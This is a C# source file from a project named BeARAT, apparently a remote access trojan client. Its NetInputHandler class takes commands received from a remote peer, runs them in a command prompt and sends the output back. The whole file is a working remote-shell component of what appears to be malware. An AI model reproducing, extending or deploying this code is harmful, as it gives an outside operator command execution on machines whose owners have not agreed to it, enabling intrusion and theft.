using BeARAT.Client.Execs;
using BeARAT.Common.IO;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace BeARAT.Client.IO
{
    class NetInputHandler : IInputHandler
    {
        private const int SLEEP_INTERVAL = 50;

        Shell sh;

        public NetInputHandler()
        {
            sh = new CommandPrompt();
        }

        public void Handle(string input)
        {
            Common.IO.Console.Debug("Standard In: " + input);
            RunShellCommand(input);
            string output = sh.StdOut();
            Model.Peer.Send(output);
            Common.IO.Console.Debug("Standard Out: " + output);
        }

        public void RunShellCommand(string input)
        {
            sh.StdIn(input);
            sh.Start();

            while (sh.IsRunning())
            {
                System.Threading.Thread.Sleep(SLEEP_INTERVAL);
            }
        }
    }
}
